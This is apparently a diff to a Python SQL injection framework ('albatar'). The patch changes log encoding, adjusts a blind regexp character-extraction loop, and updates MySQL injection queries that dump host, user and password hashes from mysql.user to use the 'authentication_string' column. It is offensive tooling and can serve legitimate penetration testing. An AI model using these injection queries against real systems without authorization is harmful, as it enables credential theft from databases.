@@ -28,7 +28,7 @@ fmt2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %
 sh = logging.StreamHandler()
 sh.setFormatter(fmt1)
 
-fh = logging.FileHandler('albatar.log')
+fh = logging.FileHandler('albatar.log', encoding='latin1')
 fh.setFormatter(fmt2)
 fh.setLevel(logging.DEBUG)
 
@@ -519,6 +519,9 @@ class Method_regexp(Method_Blind):
       char = s[0]
       logger.debug('char: %r (%d)' % (char, ord(char)))
 
+      if char == '\xff':
+        break
+
       if self.confirm_char:
         regexp = '0x%s' % ('^%s%s' % (result, char)).encode('utf-8').hex()
         payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
@@ -529,9 +532,6 @@ class Method_regexp(Method_Blind):
           requester = self.make_requester()
           logger.debug('could not confirm char')
           continue
-
-      if char == '\xff':
-        break
 
       sys.stdout.write('%s' % char)
       sys.stdout.flush()
@@ -687,10 +687,10 @@ class MySQL_Inband(SQLi_Base):
   def enum_passwords(self, user):
     if user:
       c = '(SELECT COUNT(*) X FROM mysql.user WHERE user="%s")a' % user
-      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user WHERE user="%s" LIMIT ${row_pos},${row_count})a' % user
+      q = '(SELECT CONCAT_WS(0x3a,host,user,authentication_string) X FROM mysql.user WHERE user="%s" LIMIT ${row_pos},${row_count})a' % user
     else:
       c = '(SELECT COUNT(*) X FROM mysql.user)a'
-      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user LIMIT ${row_pos},${row_count})a'
+      q = '(SELECT CONCAT_WS(0x3a,host,user,authentication_string) X FROM mysql.user LIMIT ${row_pos},${row_count})a'
 
     return c, q
 
